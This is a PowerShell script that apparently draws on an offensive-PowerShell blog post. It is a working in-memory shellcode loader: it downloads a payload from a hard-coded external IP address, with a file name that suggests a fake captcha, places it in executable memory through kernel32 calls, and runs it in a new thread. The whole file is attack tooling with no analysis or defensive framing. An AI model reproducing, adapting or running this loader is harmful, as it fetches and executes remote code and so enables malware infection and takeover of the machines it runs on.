# Reference blog post: https://www.bordergate.co.uk/offensive-powershell/
param(
	[string]$Uri = "http://94.154.35.115/user_profile_photos/cptch.bin"
)

$native = @"
using System;
using System.Runtime.InteropServices;

public static class Native
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool VirtualFreeDelegate(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint WaitForSingleObjectDelegate(IntPtr hHandle, uint dwMilliseconds);
}
"@

try {
    Add-Type -TypeDefinition $native -Language CSharp -ErrorAction Stop
}
catch {
    throw "Failed to compile native helpers: $_"
}

$hKernel32 = [Native]::LoadLibrary("kernel32.dll")
if ($hKernel32 -eq [IntPtr]::Zero) {
    throw "LoadLibrary(kernel32.dll) failed with Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error())."
}

function Get-ApiDelegate {
    param(
        [IntPtr]$Module,
        [string]$Name,
        [Type]$DelegateType
    )

    $ptr = [Native]::GetProcAddress($Module, $Name)
    if ($ptr -eq [IntPtr]::Zero) {
        throw "GetProcAddress($Name) failed with Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error())."
    }
    return [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, $DelegateType)
}

$VirtualAlloc = $null
$VirtualFree = $null
$CreateThread = $null
$WaitForSingleObject = $null
try {
    $VirtualAlloc = Get-ApiDelegate -Module $hKernel32 -Name "VirtualAlloc" -DelegateType ([Native+VirtualAllocDelegate])
    $VirtualFree = Get-ApiDelegate -Module $hKernel32 -Name "VirtualFree" -DelegateType ([Native+VirtualFreeDelegate])
    $CreateThread = Get-ApiDelegate -Module $hKernel32 -Name "CreateThread" -DelegateType ([Native+CreateThreadDelegate])
    $WaitForSingleObject = Get-ApiDelegate -Module $hKernel32 -Name "WaitForSingleObject" -DelegateType ([Native+WaitForSingleObjectDelegate])
}
catch {
    throw "Failed to resolve native API delegates: $_"
}



$webClient = New-Object System.Net.WebClient
try {
    $bytes = $webClient.DownloadData($Uri)
}
finally {
    $webClient.Dispose()
}

if (-not $bytes -or $bytes.Length -le 0) {
    throw "Downloaded payload is empty or invalid."
}

$MEM_COMMIT_RESERVE = [uint]0x3000  # MEM_COMMIT (reserve virtual memory) | MEM_RESERVE (allocate  physical pages)
$PAGE_EXECUTE_READWRITE = [uint]0x40  # PAGE_EXECUTE_READWRITE
$MEM_RELEASE = [uint]0x8000
$WAIT_INFINITE = [uint]0xFFFFFFFF

$allocationSize = [UIntPtr] $bytes.Length
$memory = $VirtualAlloc.Invoke([IntPtr]::Zero, $allocationSize, $MEM_COMMIT_RESERVE, $PAGE_EXECUTE_READWRITE)

if ($memory -eq [IntPtr]::Zero) {
	throw "VirtualAlloc failed with Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error())."
}

try {
	[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $memory, $bytes.Length)

    # Create a thread to execute the shellcode
    $thandle = $CreateThread.Invoke([IntPtr]::Zero, [uint]0, $memory, [IntPtr]::Zero, [uint]0, [IntPtr]::Zero)
    if ($thandle -eq [IntPtr]::Zero) {
        throw "CreateThread failed with Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error())."
    }

    # Wait for the thread to finish indefinitely
    $WaitForSingleObject.Invoke($thandle, $WAIT_INFINITE) | Out-Null
}
finally {
    [void]$VirtualFree.Invoke($memory, [UIntPtr]0, $MEM_RELEASE)
}
